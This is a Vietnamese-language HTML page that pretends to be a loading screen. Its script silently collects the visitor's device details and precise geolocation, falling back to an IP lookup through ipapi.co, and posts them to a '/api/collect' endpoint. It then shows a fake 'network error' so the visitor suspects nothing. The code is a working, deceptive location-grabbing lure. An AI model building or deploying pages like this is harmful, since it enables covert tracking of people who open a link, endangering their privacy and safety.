<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Đang tải...</title>
  <style>
    body { background: #fff; margin: 0; height: 100vh;}
    .centerbox {
      position: absolute; left: 50%; top: 50%;
      transform: translate(-50%, -50%);
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
    }
    .loader {
      border: 8px solid #f3f3f3; /* Light grey */
      border-top: 8px solid #3498db; /* Blue */
      border-radius: 50%;
      width: 56px;
      height: 56px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .text {
      font-family: sans-serif; 
      color: #555; 
      font-size: 1.2em;
      text-align: center;
      margin-top: 0.5em;
    }
  </style>
  <script>
    // Thiết lập thời gian tải giả ngẫu nhiên: 1-4 giây
    const minWait = 1000;
    const maxWait = 4000;
    const waitTime = Math.floor(Math.random() * (maxWait-minWait)) + minWait;

    // Gửi thông tin thiết bị/người dùng lên server
    const deviceInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        pixelRatio: window.devicePixelRatio
      }
    };
    function fetchIPLocation(cb) {
      fetch('https://ipapi.co/json/')
        .then(r=>r.json()).then(loc=>cb && cb(loc))
        .catch(()=>cb && cb(null));
    }
    function report(data) {
      fetch('/api/collect', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(data)
      });
    }

    window.onload = function() {
      // Bắt đầu thu thập dữ liệu nền
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            deviceInfo.location = {
              lat: pos.coords.latitude,
              lng: pos.coords.longitude
            };
            report(deviceInfo);
          },
          err => {
            fetchIPLocation(iploc => {
              deviceInfo.ipLocation = iploc;
              report(deviceInfo);
            });
          }
        );
      } else {
        fetchIPLocation(iploc => {
          deviceInfo.ipLocation = iploc;
          report(deviceInfo);
        });
      }
      // Sau khi hết thời gian ngẫu nhiên thì hiện lỗi mạng
      setTimeout(() => {
        document.body.innerHTML = `
          <div class="centerbox">
            <h1 style="color:red;">Lỗi mạng</h1>
            <div class="text">Vui lòng kiểm tra kết nối Internet của bạn.</div>
          </div>
        `;
      }, waitTime);
    };
  </script>
</head>
<body>
  <div class="centerbox">
    <div class="loader"></div>
    <div class="text">Đang tải...</div>
  </div>
</body>
</html>
